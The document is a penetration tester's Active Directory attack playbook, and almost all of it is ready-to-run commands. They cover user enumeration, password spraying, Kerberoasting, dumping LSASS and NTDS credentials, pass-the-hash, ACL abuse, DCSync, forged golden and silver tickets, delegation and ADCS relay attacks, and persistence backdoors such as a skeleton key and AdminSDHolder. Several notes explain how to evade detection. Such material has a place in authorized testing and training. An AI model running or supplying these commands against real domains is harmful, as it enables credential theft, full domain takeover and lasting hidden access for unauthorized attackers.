# Active Directory Attack Playbook

**Tags:** #active-directory #windows #kerberos #pentest
**Phase:** Post-Initial-Access → Domain Domination

> **Kill Chain:** Enumerate → Find Attack Path → Exploit → Escalate → Persist

---

## 0. Environment Setup

```bash
export DC_IP="10.10.10.X"
export DOMAIN="corp.local"
export USER="lowpriv"
export PASS="Password123"
export LHOST="10.10.14.X"

echo "$DC_IP $DOMAIN" >> /etc/hosts
echo "$DC_IP dc01.$DOMAIN" >> /etc/hosts
```

---

## 1. Initial Enumeration

### 1.1 Unauthenticated / Null Session

```bash
# LDAP null bind
ldapsearch -x -H ldap://$DC_IP -b "DC=corp,DC=local"

# RID cycling — user enumeration without creds
lookupsid.py guest@$DC_IP -no-pass
nxc smb "$DC_IP" -u '' -p '' --rid-brute

# AS-REP Roast without creds (pre-auth disabled accounts)
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC_IP

# Kerbrute user enumeration
kerbrute userenum --dc $DC_IP -d $DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

### 1.2 Authenticated Enumeration (PowerView)

```powershell
Import-Module .\PowerView.ps1

Get-Domain
Get-DomainController
Get-DomainUser | select name,samaccountname,description,memberof,pwdlastset,lastlogon
Get-DomainGroup | select name,member
Get-DomainComputer | select name,operatingsystem,lastlogontimestamp
Get-DomainGPO | select displayname,gpcfilesyspath

# Find exploitable ACLs
Find-InterestingDomainAcl -ResolveGUIDs | select ObjectDN,ActiveDirectoryRights,SecurityIdentifier

# Find admin sessions across domain
Invoke-UserHunter
Find-DomainUserLocation -CheckViewer

# Password policy — critical before spraying
Get-DomainDefaultPasswordPolicy
net accounts /domain
```

```bash
# Linux alternatives
impacket-GetADUsers -all $DOMAIN/$USER:$PASS -dc-ip $DC_IP
ldapdomaindump $DC_IP -u "$DOMAIN\\$USER" -p "$PASS" -o ldap_dump/
```

### 1.3 BloodHound Collection

```bash
# Python collector (Kali — remote, no Windows access needed)
bloodhound-python -u $USER -p $PASS -d $DOMAIN -ns $DC_IP -c All --zip

# SharpHound (Windows target)
.\SharpHound.exe -c All --outputdirectory C:\Temp\ --zipfilename bh.zip
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Temp\

# Start BloodHound GUI
sudo neo4j start && bloodhound &
# Drag-drop ZIP to import
```

#### BloodHound Cypher Queries

```cypher
// Shortest path to DA
MATCH p=shortestPath((u:User {name:"LOWPRIV@CORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p

// All Kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames

// AS-REP Roastable users
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

// DA sessions on computers
MATCH (u:User {admincount:true})-[:HasSession]->(c:Computer) RETURN u.name, c.name

// DCSync rights
MATCH p=(u)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN p

// Computers with unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT c.name STARTS WITH 'DC' RETURN c.name
```

---

## 2. Credential Attacks

### 2.1 Password Spraying

```bash
# Supply one RoE-approved candidate without recording it in the note.
read -rsp 'Spray candidate: ' SPRAY_PASS; printf '\n'

# NetExec
nxc smb "$DC_IP" -u users.txt -p "$SPRAY_PASS" --no-bruteforce
nxc smb "$DC_IP" -u users.txt -p "$SPRAY_PASS" --continue-on-success

# Kerbrute
kerbrute passwordspray --dc "$DC_IP" -d "$DOMAIN" users.txt "$SPRAY_PASS"

# Rate-limited spray (respect lockout policy!)
while IFS= read -r pass; do
  echo "[*] Spraying: $pass"
  nxc smb "$DC_IP" -u users.txt -p "$pass" --no-bruteforce 2>/dev/null | grep "+"
  sleep 1800
done < approved-password-candidates.txt
unset SPRAY_PASS
```

### 2.2 AS-REP Roasting

```bash
# Get hashes — accounts without pre-auth
impacket-GetNPUsers $DOMAIN/$USER:$PASS -dc-ip $DC_IP -request -format hashcat -outputfile asrep.txt
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC_IP -format hashcat -outputfile asrep.txt

# Windows — Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Crack (mode 18200)
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
```

### 2.3 Kerberoasting

```bash
# Linux — enumerate SPNs + request TGS
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC_IP -request -outputfile tgs.txt
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC_IP -request-user svc_sql

# Windows — Rubeus (OPSEC: use /aes to avoid RC4 downgrade detection)
.\Rubeus.exe kerberoast /aes /outfile:tgs.txt
.\Rubeus.exe kerberoast /rc4opsec /outfile:tgs.txt

# Crack
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
hashcat -m 19700 tgs.txt /usr/share/wordlists/rockyou.txt  # AES256
```

---

## 3. Credential Dumping

### 3.1 LSASS Dump

```bash
# Mimikatz (requires debug privilege)
privilege::debug
sekurlsa::logonpasswords
sekurlsa::wdigest        # Cleartext if wdigest enabled
sekurlsa::ekeys          # AES keys — use for OPSEC attacks

# Procdump offline (less AV detection)
procdump64.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
# Parse on Kali:
pypykatz lsa minidump lsass.dmp

# Nanodump (evasive)
.\nanodump.exe --write C:\Temp\lsass.dmp
```

### 3.2 SAM / NTDS Dump

```bash
# SAM (local accounts) via registry
reg save HKLM\SAM C:\Temp\sam.hive
reg save HKLM\SYSTEM C:\Temp\system.hive
reg save HKLM\SECURITY C:\Temp\security.hive
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL

# Remote NTDS dump (requires DA)
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC_IP
impacket-secretsdump $DOMAIN/$USER@$DC_IP -hashes :NTLMHASH
nxc smb "$DC_IP" -u "$USER" -p "$PASS" --ntds

# VSS Shadow Copy (OPSEC-safe, no API calls)
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

---

## 4. Lateral Movement via Credentials

### 4.1 Pass-the-Hash

```bash
# WMI — stealthiest (no service creation)
impacket-wmiexec $DOMAIN/$USER@$TARGET -hashes :NTLMHASH

# SMBExec — semi-stealthy
impacket-smbexec $DOMAIN/$USER@$TARGET -hashes :NTLMHASH

# PSExec — noisy (creates service + writes to disk)
impacket-psexec $DOMAIN/$USER@$TARGET -hashes :NTLMHASH

# Evil-WinRM
evil-winrm -i $TARGET -u $USER -H NTLMHASH

# Spray subnet
nxc smb "$SUBNET" -u Administrator -H "$NTLM_HASH" --local-auth
```

### 4.2 Pass-the-Ticket

```bash
# Extract tickets
.\Rubeus.exe dump /nowrap
.\Rubeus.exe dump /service:krbtgt /nowrap

# Inject into session
.\Rubeus.exe ptt /ticket:Base64Ticket
klist  # Verify

# Linux
export KRB5CCNAME=/tmp/Administrator.ccache
impacket-psexec $DOMAIN/Administrator@$TARGET -k -no-pass
```

### 4.3 Over-Pass-the-Hash

```bash
# Rubeus — no LSASS touch
.\Rubeus.exe asktgt /user:$USER /rc4:NTLMHASH /ptt
.\Rubeus.exe asktgt /user:$USER /aes256:AES256HASH /opsec /ptt

# Mimikatz (patches LSASS — detectable)
sekurlsa::pth /user:$USER /domain:$DOMAIN /ntlm:NTLMHASH /run:cmd
```

---

## 5. ACL Abuse

### 5.1 Identify Exploitable ACLs

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -like "*youruser*"}
Get-ObjectAcl -Identity "TargetUser" -ResolveGUIDs | select ActiveDirectoryRights, SecurityIdentifier
```

### 5.2 ACL Exploit Matrix

| ACL Right | Target | Attack |
|-----------|--------|--------|
| `GenericAll` | User | Reset password / shadow creds |
| `GenericAll` | Group | Add member |
| `GenericAll` | Computer | RBCD attack |
| `GenericWrite` | User | Set SPN → Kerberoast / shadow creds |
| `WriteDACL` | Any | Grant yourself GenericAll |
| `WriteOwner` | Any | Take ownership → grant rights |
| `ForceChangePassword` | User | Reset password |
| `AddKeyCredentialLink` | User | Shadow Credentials → TGT |
| `AllExtendedRights` | User | Reset password |

```powershell
# GenericAll on User → Reset Password
$pass = ConvertTo-SecureString "NewP@ss123!" -AsPlainText -Force
Set-DomainUserPassword -Identity targetuser -AccountPassword $pass

# GenericAll on Group → Add Member
Add-DomainGroupMember -Identity "Domain Admins" -Members $USER

# WriteDACL → Grant yourself GenericAll
Add-DomainObjectAcl -TargetIdentity "targetuser" -PrincipalIdentity $USER -Rights All

# WriteOwner → Take ownership first, then grant rights
Set-DomainObjectOwner -Identity targetuser -OwnerIdentity $USER
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity $USER -Rights ResetPassword
```

### 5.3 Shadow Credentials (AddKeyCredentialLink)

```bash
# Add key credential — requires WriteProperty or GenericWrite
python3 pywhisker.py -a add -t targetuser -d $DOMAIN -u $USER -p $PASS --dc-ip $DC_IP
# Outputs: targetuser.pfx + password

# Get TGT using certificate
python3 gettgtpkinit.py $DOMAIN/targetuser -cert-pfx targetuser.pfx -pfx-pass PASSWORD hash.ccache
export KRB5CCNAME=hash.ccache
python3 getnthash.py $DOMAIN/targetuser -k

# Certipy one-liner
certipy shadow auto -u $USER@$DOMAIN -p $PASS -account targetuser -dc-ip $DC_IP
```

---

## 6. Domain Escalation

### 6.1 DCSync

```bash
# Requirements: DS-Replication-Get-Changes-All right
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC_IP
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC_IP -just-dc-user krbtgt

# Mimikatz
lsadump::dcsync /domain:$DOMAIN /user:krbtgt
lsadump::dcsync /domain:$DOMAIN /all /csv
```

### 6.2 Golden Ticket

```bash
# Requirements: krbtgt NTLM hash + domain SID
impacket-lookupsid $DOMAIN/$USER:$PASS@$DC_IP | grep "Domain SID"

# Create ticket
impacket-ticketer -nthash KRBTGT_NTLM -domain-sid S-1-5-21-XXX -domain $DOMAIN Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec $DOMAIN/Administrator@$DC_IP -k -no-pass

# Mimikatz (Windows)
kerberos::golden /user:Administrator /domain:$DOMAIN /sid:S-1-5-21-XXX /krbtgt:KRBTGT_HASH /ptt
```

### 6.3 Silver Ticket (Stealthier — no DC contact at use time)

```bash
impacket-ticketer -nthash SERVICE_NTLM -domain-sid S-1-5-21-XXX -domain $DOMAIN \
  -spn cifs/target.$DOMAIN Administrator
export KRB5CCNAME=Administrator.ccache
impacket-smbclient $DOMAIN/Administrator@target.$DOMAIN -k -no-pass
```

---

## 7. Delegation Attacks

### 7.1 Unconstrained Delegation

```bash
# Find hosts with unconstrained delegation
Get-DomainComputer -Unconstrained | select name,dnshostname
netexec ldap $DC_IP -u $USER -p $PASS --trusted-for-delegation

# Monitor for incoming TGTs
.\Rubeus.exe monitor /interval:5 /nowrap

# Trigger DC auth — Printer Bug (SpoolSample/Petitpotam)
.\SpoolSample.exe $DC_IP $COMPROMISED_HOST
python3 PetitPotam.py -u $USER -p $PASS $COMPROMISED_HOST $DC_IP

# Extract DC TGT + DCSync
.\Rubeus.exe ptt /ticket:<ticket>
```

### 7.2 Constrained Delegation (S4U2Proxy)

```bash
# Find accounts with constrained delegation
Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto

# Abuse: impersonate any user to allowed service
.\Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator \
  /msdsspn:cifs/server.$DOMAIN /ptt

# Linux
impacket-getST $DOMAIN/svc_account -hashes :HASH \
  -impersonate Administrator -spn cifs/server.$DOMAIN -dc-ip $DC_IP
```

### 7.3 RBCD (Resource-Based Constrained Delegation)

```bash
# Requirements: GenericWrite/GenericAll on target computer object

# 1. Create fake computer account
impacket-addcomputer $DOMAIN/$USER:$PASS -dc-ip $DC_IP \
  -computer-name "ATTACKPC$" -computer-pass "Attack123!"

# 2. Set delegation on target
impacket-rbcd $DOMAIN/$USER:$PASS -dc-ip $DC_IP \
  -action write -delegate-to "TARGET$" -delegate-from "ATTACKPC$"

# 3. Impersonate Administrator on target
impacket-getST $DOMAIN/'ATTACKPC$':Attack123! -dc-ip $DC_IP \
  -impersonate Administrator -spn cifs/target.$DOMAIN
export KRB5CCNAME=Administrator@cifs_target.ccache
impacket-psexec $DOMAIN/Administrator@target.$DOMAIN -k -no-pass
```

---

## 8. ADCS Attacks

### 8.1 Enumerate Vulnerable Templates

```bash
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP -enabled -vulnerable -stdout
.\Certify.exe find /vulnerable
```

### 8.2 ESC1 — Enrollee Supplies Subject

```bash
certipy req -u $USER@$DOMAIN -p $PASS -ca CA_NAME \
  -template VULN_TEMPLATE -upn administrator@$DOMAIN -dc-ip $DC_IP
certipy auth -pfx administrator.pfx -domain $DOMAIN -dc-ip $DC_IP
```

### 8.3 ESC8 — NTLM Relay to HTTP Enrollment

```bash
# Start relay
impacket-ntlmrelayx -t http://ca.$DOMAIN/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# Coerce DC auth
python3 PetitPotam.py -u $USER -p $PASS $LHOST $DC_IP

# Auth with resulting cert
echo "BASE64CERT" | base64 -d > dc.pfx
certipy auth -pfx dc.pfx -domain $DOMAIN -dc-ip $DC_IP
```

---

## 9. Trust Attacks

```bash
# Enumerate trusts
Get-DomainTrust
nltest /domain_trusts

# Child → Parent (ExtraSids attack)
# Get Enterprise Admins SID
Get-DomainGroup "Enterprise Admins" -Domain parent.local | select objectsid

# Forge inter-domain TGT with extra SID
impacket-ticketer -nthash CHILD_KRBTGT -domain-sid CHILD_DOMAIN_SID \
  -domain child.$DOMAIN -extra-sid ENTERPRISE_ADMIN_SID Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec parent.$DOMAIN/Administrator@parent-dc.$DOMAIN -k -no-pass
```

---

## 10. Persistence

```powershell
# AdminSDHolder Backdoor (auto-propagated to all protected groups hourly)
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
  -PrincipalIdentity backd00ruser -Rights All -Verbose

# DSRM Admin (survives domain admin removal)
ntdsutil "set dsrm password" "sync from domain account $USER" q q
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" "DsrmAdminLogonBehavior" 2

# Skeleton Key (universal password "mimikatz" — removed on reboot)
privilege::debug
misc::skeleton
```

---

## Quick Reference Table

| Goal | Command |
|------|---------|
| User enum (no creds) | `kerbrute userenum --dc $DC_IP -d $DOMAIN users.txt` |
| Password spray | `nxc smb "$DC_IP" -u users.txt -p "$SPRAY_PASS" --no-bruteforce` |
| AS-REP Roast | `GetNPUsers.py $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC_IP` |
| Kerberoast | `GetUserSPNs.py $DOMAIN/$USER:$PASS -dc-ip $DC_IP -request` |
| BloodHound | `bloodhound-python -u $USER -p $PASS -d $DOMAIN -ns $DC_IP -c All` |
| ACL check | `Find-InterestingDomainAcl -ResolveGUIDs` |
| DCSync | `secretsdump.py $DOMAIN/$USER:$PASS@$DC_IP` |
| PtH shell | `impacket-wmiexec $DOMAIN/$USER@$TARGET -hashes :HASH` |
| Golden Ticket | `impacket-ticketer -nthash KRBTGT -domain-sid SID -domain $DOMAIN Administrator` |
| ADCS scan | `certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP -vulnerable -stdout` |
| LAPS read | `netexec ldap $DC_IP -u $USER -p $PASS -M laps` |
| RBCD | `impacket-rbcd $DOMAIN/$USER:$PASS -action write -delegate-to TARGET$ -delegate-from FAKEPC$` |

---

## Related Notes

- [[00-Quick-Reference/Kerberoasting]]
- [[00-Quick-Reference/Mimikatz]]
- [[00-Quick-Reference/Active Directory Certification Services]]
- [[00-Quick-Reference/OPSEC]]
- [[06-Lateral-Movement/INDEX]]
- [[04-Exploitation/Windows/BloodHound - SharpHound]]
